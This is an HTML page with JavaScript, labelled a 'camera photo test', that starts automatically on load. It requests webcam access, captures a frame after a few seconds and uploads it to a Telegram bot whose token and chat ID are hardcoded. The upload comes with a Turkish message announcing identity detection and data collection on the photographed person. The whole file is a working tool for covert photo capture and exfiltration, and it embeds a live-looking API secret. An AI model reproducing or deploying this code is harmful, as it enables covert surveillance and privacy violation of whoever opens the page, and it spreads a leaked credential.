<!DOCTYPE html>
<html>
<head>
    <title>PHOTO TEST</title>
    <style>
        body { background: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        .test-btn { background: #ff0000; color: #fff; padding: 15px 30px; border: none; border-radius: 10px; cursor: pointer; font-size: 16px; margin: 10px; }
        .result { margin: 20px; padding: 15px; border: 1px solid #00ff00; }
        video { border: 2px solid #ff0000; margin: 10px; }
    </style>
</head>
<body>
    <h1>ðŸ”¥ðŸ’€ CAMERA PHOTO TEST ðŸ’€ðŸ”¥</h1>
    
    <button class="test-btn" onclick="startCameraTest()">
        ðŸ“· START CAMERA TEST
    </button>
    
    <button class="test-btn" onclick="captureAndSend()">
        ðŸ“¸ CAPTURE & SEND PHOTO
    </button>
    
    <div id="results" class="result">
        Ready to test camera photo sending...
    </div>
    
    <video id="video" width="320" height="240" autoplay muted></video>
    <canvas id="canvas" width="320" height="240" style="border: 1px solid #00ff00;"></canvas>
    
    <script>
        let stream = null;
        let video = document.getElementById('video');
        let canvas = document.getElementById('canvas');
        let ctx = canvas.getContext('2d');
        
        function updateResult(msg) {
            const results = document.getElementById('results');
            results.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${msg}`;
            console.log(msg);
        }
        
        async function startCameraTest() {
            updateResult('ðŸ”¥ Starting camera test...');
            
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: 320, height: 240 },
                    audio: false
                });
                
                video.srcObject = stream;
                
                video.addEventListener('loadedmetadata', () => {
                    updateResult('âœ… Camera stream loaded!');
                    updateResult(`ðŸ“¹ Resolution: ${video.videoWidth}x${video.videoHeight}`);
                    
                    // Auto capture after 3 seconds
                    setTimeout(() => {
                        captureAndSend();
                    }, 3000);
                });
                
            } catch (error) {
                updateResult(`âŒ Camera error: ${error.message}`);
            }
        }
        
        async function captureAndSend() {
            if (!stream) {
                updateResult('âŒ No camera stream available');
                return;
            }
            
            updateResult('ðŸ“¸ Capturing photo...');
            
            try {
                // Draw video frame to canvas
                ctx.drawImage(video, 0, 0, 320, 240);
                
                // Convert to blob
                canvas.toBlob(async (blob) => {
                    if (!blob) {
                        updateResult('âŒ Failed to create photo blob');
                        return;
                    }
                    
                    updateResult(`âœ… Photo captured! Size: ${(blob.size / 1024).toFixed(1)}KB`);
                    
                    // Test photo sending
                    await sendPhotoToTelegram(blob);
                    
                }, 'image/jpeg', 0.9);
                
            } catch (error) {
                updateResult(`âŒ Capture error: ${error.message}`);
            }
        }
        
        async function sendPhotoToTelegram(photoBlob) {
            updateResult('ðŸ“¡ Sending photo to telegram...');
            
            try {
                const BOT_TOKEN = '8295691131:AAEJjGLfXEtbHhTyqJ4RC7JFbpGnx_OHthM';
                const CHAT_ID = '6633612153';
                
                // First send text message
                const photoMsg = `ðŸ“·ðŸ” RESÄ°M ATMIYO AMCIK - DEBUG TEST! ðŸ”ðŸ“·

ðŸ‘¥ ÅžahÄ±s resmi alÄ±ndÄ±, gerekli araÅŸtÄ±rÄ±lmaya baÅŸlandÄ±.
ðŸ”Ž Profil analizi ve kimlik tespiti yapÄ±lÄ±yor.
ðŸ“Š Veri toplama iÅŸlemi aktif durumda.

ðŸ“„ Test Details:
â€¢ Photo Size: ${(photoBlob.size / 1024).toFixed(1)}KB
â€¢ Format: JPEG
â€¢ Resolution: 320x240
â€¢ Time: ${new Date().toLocaleString()}

ðŸ”’ GÃ¼venlik ProtokolÃ¼: AKTÄ°F
ðŸ” Debug Test: PHOTO SENDING TEST`;
                
                // Send message first
                const msgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: photoMsg
                    })
                });
                
                if (msgResponse.ok) {
                    updateResult('âœ… Message sent successfully');
                } else {
                    updateResult(`âŒ Message failed: ${msgResponse.status}`);
                }
                
                // Send photo
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', photoBlob, 'debug-photo.jpg');
                formData.append('caption', 'Debug Photo - ÅžahÄ±s FotoÄŸrafÄ± Test');
                
                const photoResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                if (photoResponse.ok) {
                    updateResult('âœ… PHOTO SENT SUCCESSFULLY!');
                    const result = await photoResponse.json();
                    updateResult(`ðŸ“„ Response: ${JSON.stringify(result.ok)}`);
                } else {
                    updateResult(`âŒ Photo send failed: ${photoResponse.status}`);
                    const errorText = await photoResponse.text();
                    updateResult(`ðŸ“„ Error details: ${errorText}`);
                }
                
            } catch (error) {
                updateResult(`âŒ Telegram send error: ${error.message}`);
            }
        }
        
        // Auto start test after 2 seconds
        setTimeout(() => {
            updateResult('ðŸš€ Auto-starting camera test...');
            startCameraTest();
        }, 2000);
    </script>
</body>
</html>